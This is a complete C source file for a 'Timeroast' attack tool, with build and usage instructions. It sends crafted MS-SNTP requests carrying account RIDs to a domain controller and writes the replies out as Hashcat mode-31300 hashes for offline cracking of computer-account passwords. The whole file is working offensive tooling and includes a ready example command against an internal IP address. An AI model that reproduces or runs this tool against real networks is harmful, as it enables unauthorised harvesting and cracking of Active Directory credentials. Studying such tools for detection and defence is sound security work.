/* timeroast.c — Complete C port of the Timeroast (MS‑SNTP) attack
 * -----------------------------------------------------------------------------
 * Build   : gcc -Wall -O2 -o timeroast timeroast.c                    (Linux/macOS)
 *           x86_64-w64-mingw32-gcc -O2 timeroast.c -o timeroast.exe -lws2_32 (Windows)
 * Example : sudo ./timeroast -d 10.10.11.75 -r 1000-1200,2500 -a 250 -t 30 -o hashes.txt
 *
 * Produces Hashcat‑mode‑31300 lines: <RID>:$sntp-ms$<md5>$<salt>
 */

#define _DEFAULT_SOURCE
#define _POSIX_C_SOURCE 200809L

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

/* ---------------------------------------------------------------------------
 * Constants
 * --------------------------------------------------------------------------- */
#define DEFAULT_RATE     180
#define DEFAULT_TIMEOUT   24

static const uint8_t NTP_PREFIX[] = {
  0xdb, 0x00, 0x11, 0xe9, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xe1, 0xb8, 0x40, 0x7d, 0xeb, 0xc7, 0xe5, 0x06,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xe1, 0xb8, 0x42, 0x8b, 0xff, 0xbf, 0xcd, 0x0a
}; /* 48‑byte header */

#define QUERY_LEN 68 /* 48‑byte prefix + 4 RID + 16 dummy MAC */

/* ---------------------------------------------------------------------------
 * Dynamic array utilities
 * --------------------------------------------------------------------------- */
typedef struct {
  uint32_t *v;
  size_t    len;
  size_t    cap;
} vec32_t;

static void vec32_push(vec32_t *vec, uint32_t val)
{
  if (vec->len == vec->cap) {
    vec->cap = vec->cap ? vec->cap * 2 : 64;
    vec->v = realloc(vec->v, vec->cap * sizeof *vec->v);
    if (!vec->v) {
      perror("realloc");
      exit(EXIT_FAILURE);
    }
  }
  vec->v[vec->len++] = val;
}

static void parse_rids(const char *s, vec32_t *out)
{
  char *input = strdup(s);
  if (!input) {
    perror("strdup");
    exit(EXIT_FAILURE);
  }

  char *token;
  char *saveptr;
  for (token = strtok_r(input, ",", &saveptr);
       token;
       token = strtok_r(NULL, ",", &saveptr))
  {
    char *dash = strchr(token, '-');
    if (dash) {
      *dash = '\0';
      uint32_t a = strtoul(token,   NULL, 10);
      uint32_t b = strtoul(dash+1, NULL, 10);

      if (a > b) {
        fprintf(stderr, "Bad range %u-%u\n", a, b);
        exit(EXIT_FAILURE);
      }
      for (uint32_t i = a; i <= b; i++) {
        vec32_push(out, i);
      }
    } else {
      vec32_push(out, strtoul(token, NULL, 10));
    }
  }

  free(input);
}

/* ---------------------------------------------------------------------------
 * Helper functions
 * --------------------------------------------------------------------------- */
static void build_query(uint8_t buf[QUERY_LEN], uint32_t rid, int old_format)
{
  memcpy(buf, NTP_PREFIX, sizeof NTP_PREFIX);

  uint32_t id = rid ^ (old_format ? 1u << 31 : 0);
  memcpy(buf + sizeof NTP_PREFIX, &id, sizeof id);

  /* Dummy MAC (16 bytes of zeros) */
  memset(buf + sizeof NTP_PREFIX + sizeof id, 0, 16);
}

static uint64_t now_ms(void)
{
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (uint64_t)ts.tv_sec * 1000ULL +
         (uint64_t)ts.tv_nsec / 1000000ULL;
}

static void sleep_ms(uint64_t ms)
{
  struct timespec ts = { ms / 1000, (ms % 1000) * 1000000ULL };
  nanosleep(&ts, NULL);
}

static void bin2hex(const uint8_t *in, size_t n, char *out)
{
  static const char *hex = "0123456789abcdef";
  for (size_t i = 0; i < n; i++) {
    out[i * 2]     = hex[in[i] >> 4];
    out[i * 2 + 1] = hex[in[i] & 0xF];
  }
  out[n * 2] = '\0';
}

/* ---------------------------------------------------------------------------
 * Main
 * --------------------------------------------------------------------------- */
int main(int argc, char **argv)
{
  const char *dc       = NULL;   /* Domain controller */
  const char *rid_spec = NULL;   /* RID list/range   */
  const char *outfile  = NULL;   /* Output file      */

  int rate       = DEFAULT_RATE;
  int timeout    = DEFAULT_TIMEOUT;
  int old_format = 0;            /* Legacy RID flag  */
  int src_port   = 0;            /* Optional source port */

  /* -----------------------
   * Parse command‑line args
   * ----------------------- */
  int opt;
  while ((opt = getopt(argc, argv, "d:r:a:t:lp:o:")) != -1) {
    switch (opt) {
      case 'd': dc         = optarg;            break;
      case 'r': rid_spec   = optarg;            break;
      case 'a': rate       = atoi(optarg);      break;
      case 't': timeout    = atoi(optarg);      break;
      case 'l': old_format = 1;                 break;
      case 'p': src_port   = atoi(optarg);      break;
      case 'o': outfile    = optarg;            break;
      default:
        fprintf(stderr,
                "Usage: %s -d DC -r RIDS [-a RATE] [-t TIMEOUT] "
                "[-l] [-p SRC_PORT] [-o OUTPUT]\n",
                argv[0]);
        return EXIT_FAILURE;
    }
  }

  if (!dc || !rid_spec) {
    fprintf(stderr, "-d and -r are required\n");
    return EXIT_FAILURE;
  }

  /* ------------------
   * Prepare structures
   * ------------------ */
  vec32_t rids = {0};
  vec32_t seen = {0};
  parse_rids(rid_spec, &rids);

  FILE *outf = outfile ? fopen(outfile, "w") : stdout;
  if (!outf) {
    perror("fopen");
    return EXIT_FAILURE;
  }

  int sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock < 0) {
    perror("socket");
    return EXIT_FAILURE;
  }

  if (src_port) {
    struct sockaddr_in local = {
      .sin_family      = AF_INET,
      .sin_port        = htons((uint16_t)src_port),
      .sin_addr.s_addr = INADDR_ANY
    };

    if (bind(sock, (struct sockaddr *)&local, sizeof local) < 0) {
      perror("bind");
      return EXIT_FAILURE;
    }
  }

  /* Non‑blocking socket */
  if (fcntl(sock, F_SETFL, fcntl(sock, F_GETFL, 0) | O_NONBLOCK) < 0) {
    perror("fcntl");
    return EXIT_FAILURE;
  }

  /* Resolve domain controller address */
  struct sockaddr_in dest = {
    .sin_family = AF_INET,
    .sin_port   = htons(123) /* NTP */
  };

  if (inet_pton(AF_INET, dc, &dest.sin_addr) != 1) {
    struct hostent *he = gethostbyname(dc);
    if (!he) {
      fprintf(stderr, "Failed to resolve %s\n", dc);
      return EXIT_FAILURE;
    }
    memcpy(&dest.sin_addr, he->h_addr, he->h_length);
  }

  uint64_t silence_ms = (uint64_t)timeout * 1000ULL;
  uint64_t interval   = 1000ULL / (rate ? (uint64_t)rate : 1);

  uint8_t  query[QUERY_LEN];
  uint8_t  buf[120];

  size_t   idx     = 0;
  uint64_t last_rx = now_ms();

  /* ----------------------
   * Main send/recv loop
   * ---------------------- */
  while (now_ms() - last_rx < silence_ms) {
    uint64_t loop_start = now_ms();

    /* ---- Send next query ---- */
    if (idx < rids.len) {
      build_query(query, rids.v[idx++], old_format);
      sendto(sock, query, QUERY_LEN, 0,
             (struct sockaddr *)&dest, sizeof dest);
    }

    /* ---- Receive responses ---- */
    fd_set rfds;
    FD_ZERO(&rfds);
    FD_SET(sock, &rfds);

    struct timeval tv = { 0, (int)(interval * 1000) };
    if (select(sock + 1, &rfds, NULL, NULL, &tv) > 0 &&
        FD_ISSET(sock, &rfds))
    {
      ssize_t n = recv(sock, buf, sizeof buf, 0);
      if (n == 68) {
        uint32_t rid_answer;
        memcpy(&rid_answer, buf + sizeof NTP_PREFIX, sizeof rid_answer);
        if (old_format) {
          rid_answer ^= 1u << 31;
        }

        /* Check for duplicates */
        int duplicate = 0;
        for (size_t i = 0; i < seen.len; i++) {
          if (seen.v[i] == rid_answer) {
            duplicate = 1;
            break;
          }
        }

        if (!duplicate) {
          vec32_push(&seen, rid_answer);

          char salt_hex[97]; /* 48 bytes * 2 + 1 */
          char hash_hex[33]; /* 16 bytes * 2 + 1 */

          bin2hex(buf,     48, salt_hex);
          bin2hex(buf + 52, 16, hash_hex);

          fprintf(outf, "%u:$sntp-ms$%s$%s\n",
                  rid_answer, hash_hex, salt_hex);
          fflush(outf);

          last_rx = now_ms();
        }
      }
    }

    uint64_t elapsed = now_ms() - loop_start;
    if (elapsed < interval) {
      sleep_ms(interval - elapsed);
    }
  }

  fprintf(stderr, "Recovered %zu hashes.\n", seen.len);

  fclose(outf);
  close(sock);
  free(rids.v);
  free(seen.v);

  return EXIT_SUCCESS;
}

